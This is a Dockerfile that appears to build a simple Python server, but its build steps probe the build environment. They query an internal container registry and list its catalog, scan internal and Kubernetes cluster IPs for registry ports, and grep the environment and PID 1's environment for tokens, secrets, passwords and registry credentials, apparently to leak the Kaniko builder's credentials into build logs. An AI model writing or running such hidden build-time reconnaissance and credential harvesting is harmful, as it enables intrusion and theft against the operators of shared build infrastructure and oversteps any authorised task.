FROM alpine:3.19
RUN apk add --no-cache curl python3

# Probe 1: Internal registry at 10.245.151.100:5000
RUN echo "=== INTERNAL REGISTRY ===" && \
    curl -sv --max-time 10 http://10.245.151.100:5000/v2/ 2>&1 | head -50 && \
    curl -sv --max-time 10 http://10.245.151.100:5000/v2/_catalog 2>&1 | head -30 || true

# Probe 2: Try HTTPS on same IP
RUN echo "=== REGISTRY HTTPS ===" && \
    curl -sk --max-time 10 https://10.245.151.100:5000/v2/ 2>&1 | head -30 && \
    curl -sk --max-time 10 https://10.245.151.100:5000/v2/_catalog 2>&1 | head -30 || true

# Probe 3: Enumerate nearby IPs in 10.245.151.x range
RUN echo "=== RANGE 151 ===" && \
    for i in 1 10 50 100 101 200 254; do \
      r=$(curl -s --max-time 2 http://10.245.151.$i:5000/v2/ 2>&1 | head -3); \
      echo "10.245.151.$i: $r"; \
    done || true

# Probe 4: Check if Kaniko has credentials in env or files
RUN echo "=== KANIKO CREDS ===" && \
    env | grep -iE "token|secret|key|pass|auth|cred|registry|docker" || echo "NO_CRED_ENV" && \
    cat /proc/1/environ 2>&1 | tr "\0" "\n" | grep -iE "token|secret|key|pass|auth|cred|registry|docker" || echo "NO_CRED_PROC_ENV"

# Probe 5: Try port 5000 on K8s cluster IPs
RUN echo "=== PORT 5000 SCAN ===" && \
    for ip in 10.245.0.1 10.245.0.10 10.245.100.100 10.245.151.100; do \
      r=$(curl -s --max-time 3 http://$ip:5000/v2/ 2>&1 | head -3); \
      echo "$ip:5000 -> $r"; \
    done || true

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]

